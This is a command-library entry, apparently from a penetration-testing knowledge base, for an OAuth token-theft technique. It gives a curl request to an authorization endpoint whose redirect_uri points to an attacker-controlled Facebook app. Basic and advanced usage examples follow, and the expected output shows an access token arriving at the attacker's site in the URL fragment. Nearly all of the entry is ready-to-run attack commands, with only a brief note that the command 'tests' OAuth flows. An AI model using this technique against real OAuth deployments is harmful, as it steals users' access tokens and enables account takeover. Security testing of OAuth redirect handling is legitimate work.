---
type: command
executor: bash
data: >-
  curl
  "https://www.example.com/oauth2/authorize?client_id=$_CLIENT_ID&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F&scope=$_SCOPE&response_type=token"
output: null
platforms:
  - Web
tags:
  - oauth
  - token-theft
verified: true
validated: true
---

# curl-oauth-authorize-redirect-to-attacker-site

## Command

```bash
curl "https://www.example.com/oauth2/authorize?client_id=$_CLIENT_ID&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F&scope=$_SCOPE&response_type=token"
```

## Description

This command tests OAuth flows integrated with third-party providers by setting a redirect_uri to an attacker-controlled app on a platform like Facebook, exploiting potential open redirects to steal tokens in the implicit flow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CLIENT_ID | The OAuth client ID | Yes |
| $_SCOPE | Scope of access (e.g., 'email') | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.example.com/oauth2/authorize?client_id=myapp&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F&scope=email&response_type=token"
```

### Advanced Usage

```bash
curl "https://www.example.com/oauth2/authorize?client_id=myapp&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F&scope=email profile&response_type=token&state=def456"
```

## Expected Output

Redirect response chaining to the provider, ultimately hitting the attacker site with #access_token=TOKEN in the fragment. Example: HTTP/1.1 302\nLocation: https://apps.facebook.com/attacker/?#access_token=xyz...

## Related

- [[procedures/OAuth-Token-Theft-via-Redirect-URI]]
